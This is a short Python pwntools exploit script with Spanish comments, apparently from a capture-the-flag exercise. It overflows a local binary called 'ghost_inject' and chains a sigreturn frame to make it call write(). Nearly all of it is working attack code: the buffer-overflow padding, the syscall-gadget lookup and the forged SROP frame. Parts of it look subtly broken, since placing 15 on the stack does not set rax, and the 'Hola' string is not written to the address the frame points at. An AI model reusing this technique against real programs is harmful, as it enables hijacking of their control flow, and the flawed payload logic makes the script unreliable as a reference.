#!/usr/bin/env python3
from pwn import *

context.binary = './ghost_inject'
context.arch = 'amd64'

elf = ELF('./ghost_inject')
rop = ROP(elf)

# Buscar un gadget syscall; ret
syscall = rop.find_gadget(['syscall', 'ret'])[0]
log.success(f'Syscall gadget: {hex(syscall)}')

# Frame de sigreturn para write(1, "Hola", 4)
frame = SigreturnFrame()
frame.rax = constants.SYS_write   # syscall número de write
frame.rdi = 1                     # stdout
frame.rsi = 0x404000              # dirección donde estará "Hola"
frame.rdx = 4                     # longitud del mensaje
frame.rip = syscall               # gadget syscall

# Payload
payload  = b'A' * 136             # overflow (ajusta si usas más padding)
payload += p64(15)                # syscall sigreturn
payload += p64(syscall)          # gadget syscall
payload += bytes(frame)          # fake frame
payload += b'Hola'               # string a imprimir

# Ejecutamos proceso y enviamos
io = process('./ghost_inject')
io.send(payload)
io.interactive()
